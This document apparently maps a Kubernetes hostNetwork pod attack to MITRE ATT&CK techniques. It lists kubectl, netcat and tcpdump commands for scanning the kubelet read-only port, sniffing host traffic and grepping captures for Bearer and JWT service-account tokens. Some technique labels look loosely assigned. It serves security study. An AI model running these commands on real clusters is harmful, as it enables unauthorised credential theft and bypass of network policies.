# MITRE ATT&CK Mapping: HostNetwork Pod

## Attack Flow

```
Initial Access → Execution → Discovery → Collection → Defense Evasion
```

---

## MITRE ATT&CK Techniques

### 1. Initial Access

#### T1078 - Valid Accounts
**Behavior:** Attacker uses compromised Kubernetes credentials

**Procedures:**
```bash
kubectl apply -f hostnetwork-exec-pod.yaml
```

---

### 2. Execution

#### T1609 - Container Administration Command
**Behavior:** Execute commands in container via kubectl exec

**Procedures:**
```bash
kubectl exec -it hostnetwork-exec-pod -- bash
```

#### T1059.004 - Command and Scripting Interpreter: Unix Shell
**Behavior:** Execute bash commands for network reconnaissance and sniffing

**Procedures:**
```bash
apt update && apt -y install tcpdump net-tools netcat
nc -zv 10.0.0.162 10255
tcpdump -ni eth0 -s0 -w kubelet-ro.cap port 10255
```

---

### 3. Discovery

#### T1046 - Network Service Discovery
**Behavior:** Discover services listening on localhost and host network

**Procedures:**
```bash
nc -zv 10.0.0.162 10255
nc -zv 172.17.0.1 10255
curl https://localhost:1234/metrics
netstat -tulpn
```

---

### 4. Collection

#### T1040 - Network Sniffing
**Behavior:** Capture network traffic on host interfaces

**Procedures:**
```bash
# Sniff traffic on host interface
tcpdump -ni eth0 -s0 -w kubelet-ro.cap port 10255

# Read captured traffic
tcpdump -r kubelet-ro.cap -s0 -A

# Search for tokens
tcpdump -r kubelet-ro.cap -s0 -A | grep Bearer
tcpdump -r kubelet-ro.cap -s0 -A | grep "eyJhbGciOiJ"
```

#### T1552.004 - Unsecured Credentials: Private Keys  
**Behavior:** Capture service account tokens and JWT tokens from network traffic

**Procedures:**
```bash
tcpdump -r kubelet-ro.cap -s0 -A | grep Bearer
tcpdump -r kubelet-ro.cap -s0 -A | grep -i "token\|authorization"
```

---

### 5. Defense Evasion

#### T1599.001 - Network Boundary Bridging: Network Address Translation Traversal
**Behavior:** Bypass network policies by using host network namespace

**Procedures:**
```yaml
# Pod with hostNetwork bypasses namespace network policies
spec:
  hostNetwork: true
```

---

## Technique Summary

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1078 | Valid Accounts |
| Execution | T1609 | Container Administration Command |
| Execution | T1059.004 | Unix Shell |
| Discovery | T1046 | Network Service Discovery |
| Collection | T1040 | Network Sniffing |
| Collection | T1552.004 | Private Keys |
| Defense Evasion | T1599.001 | Network Address Translation Traversal |

**Total: 7 Techniques across 5 Tactics**

**Pod Configuration:**
```yaml
spec:
  hostNetwork: true
```

**Key Features:**
- Sniff traffic on all host network interfaces
- Access services bound to localhost
- Bypass network policies
- Capture unencrypted service account tokens
- No direct path to root
